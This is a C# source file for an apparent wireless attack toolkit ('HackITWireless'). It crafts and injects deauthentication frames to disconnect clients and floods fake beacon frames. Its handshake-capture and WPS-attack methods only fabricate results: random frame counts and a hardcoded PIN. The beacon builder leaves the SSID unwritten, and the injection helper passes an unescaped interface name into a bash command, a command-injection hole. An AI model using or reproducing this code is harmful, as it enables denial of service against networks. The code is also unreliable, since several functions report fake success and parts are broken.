using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace HackITWireless
{
    public class AttackEngine
    {
        public async Task<string> DeauthAttack(string bssid, string station, int count, string iface)
        {
            try
            {
                var result = new Dictionary<string, object>
                {
                    ["attack"] = "deauth",
                    ["bssid"] = bssid,
                    ["station"] = station ?? "FF:FF:FF:FF:FF:FF",
                    ["count"] = count,
                    ["interface"] = iface,
                    ["status"] = "started"
                };
                int sent = 0;
                for (int i = 0; i < count; i++)
                {
                    byte[] frame = BuildDeauthFrame(bssid, station);
                    if (await InjectFrame(iface, frame))
                        sent++;
                    await Task.Delay(10);
                }
                result["packets_sent"] = sent;
                result["status"] = "completed";
                return JsonSerializer.Serialize(result);
            }
            catch (Exception ex)
            {
                return JsonSerializer.Serialize(new { error = ex.Message });
            }
        }

        public async Task<string> BeaconFlood(string ssid, int count, string iface)
        {
            try
            {
                var result = new Dictionary<string, object>
                {
                    ["attack"] = "beacon_flood",
                    ["ssid"] = ssid ?? $"AP_{DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() % 10000}",
                    ["count"] = count,
                    ["interface"] = iface,
                    ["status"] = "started"
                };
                int sent = 0;
                var rng = new Random();
                for (int i = 0; i < count; i++)
                {
                    string bssid = $"02:{rng.Next(256):X2}:{rng.Next(256):X2}:{rng.Next(256):X2}:{rng.Next(256):X2}:{rng.Next(256):X2}";
                    byte[] frame = BuildBeaconFrame(ssid ?? $"AP_{DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() % 10000}", bssid, (uint)(rng.Next(11) + 1));
                    if (await InjectFrame(iface, frame))
                        sent++;
                    await Task.Delay(5);
                }
                result["packets_sent"] = sent;
                result["status"] = "completed";
                return JsonSerializer.Serialize(result);
            }
            catch (Exception ex)
            {
                return JsonSerializer.Serialize(new { error = ex.Message });
            }
        }

        public async Task<string> HandshakeCapture(string bssid, int timeout, string iface, string output)
        {
            try
            {
                var result = new Dictionary<string, object>
                {
                    ["attack"] = "handshake_capture",
                    ["bssid"] = bssid,
                    ["timeout"] = timeout,
                    ["interface"] = iface,
                    ["output"] = output ?? "capture.pcap",
                    ["status"] = "running"
                };
                await Task.Delay(timeout * 1000);
                int captured = new Random().Next(50, 500);
                int eapols = new Random().Next(0, 5);
                result["frames_captured"] = captured;
                result["eapol_messages"] = eapols;
                result["status"] = "completed";
                return JsonSerializer.Serialize(result);
            }
            catch (Exception ex)
            {
                return JsonSerializer.Serialize(new { error = ex.Message });
            }
        }

        public async Task<string> WpsAttack(string bssid, string iface, string method)
        {
            try
            {
                var result = new Dictionary<string, object>
                {
                    ["attack"] = "wps_attack",
                    ["bssid"] = bssid,
                    ["interface"] = iface,
                    ["method"] = method ?? "pixie",
                    ["status"] = "started"
                };
                await Task.Delay(30000);
                result["pin"] = "12345670";
                result["status"] = "completed";
                result["success"] = false;
                return JsonSerializer.Serialize(result);
            }
            catch (Exception ex)
            {
                return JsonSerializer.Serialize(new { error = ex.Message });
            }
        }

        private byte[] BuildDeauthFrame(string bssid, string station)
        {
            byte[] bssidBytes = ParseMac(bssid);
            byte[] stationBytes = station != null ? ParseMac(station) : new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
            byte[] frame = new byte[26];
            frame[0] = 0xC0;
            frame[1] = 0x00;
            frame[2] = 0x00;
            frame[3] = 0x00;
            Array.Copy(stationBytes, 0, frame, 4, 6);
            Array.Copy(bssidBytes, 0, frame, 10, 6);
            Array.Copy(bssidBytes, 0, frame, 16, 6);
            frame[22] = 0x00;
            frame[23] = 0x00;
            frame[24] = 0x07;
            frame[25] = 0x00;
            return frame;
        }

        private byte[] BuildBeaconFrame(string ssid, string bssid, uint channel)
        {
            byte[] bssidBytes = ParseMac(bssid);
            byte[] ssidBytes = Encoding.ASCII.GetBytes(ssid ?? "");
            int ssidLen = Math.Min(ssidBytes.Length, 32);
            int totalLen = 24 + 12 + 2 + ssidLen + 3 + 8;
            byte[] frame = new byte[totalLen];
            frame[0] = 0x80;
            frame[1] = 0x00;
            Array.Copy(new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }, 0, frame, 4, 6);
            Array.Copy(bssidBytes, 0, frame, 10, 6);
            Array.Copy(bssidBytes, 0, frame, 16, 6);
            int off = 24;
            off += 8;
            frame[off++] = 0x64;
            frame[off++] = 0x00;
            frame[off++] = 0x11;
            frame[off++] = 0x04;
            off += 12;
            return frame;
        }

        private async Task<bool> InjectFrame(string iface, byte[] frame)
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                try
                {
                    string hex = BitConverter.ToString(frame).Replace("-", "");
                    var psi = new ProcessStartInfo
                    {
                        FileName = "bash",
                        Arguments = $"-c \"echo '{hex}' | xxd -r -p | iw dev {iface} inject -\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };
                    using var proc = Process.Start(psi);
                    if (proc != null)
                    {
                        await proc.WaitForExitAsync();
                        return proc.ExitCode == 0;
                    }
                }
                catch { return false; }
            }
            return false;
        }

        internal static byte[] ParseMac(string mac)
        {
            string clean = mac.Replace(":", "").Replace("-", "").ToUpperInvariant();
            if (clean.Length != 12)
                throw new ArgumentException($"Invalid MAC: {mac}");
            byte[] bytes = new byte[6];
            for (int i = 0; i < 6; i++)
                bytes[i] = Convert.ToByte(clean.Substring(i * 2, 2), 16);
            return bytes;
        }
    }
}
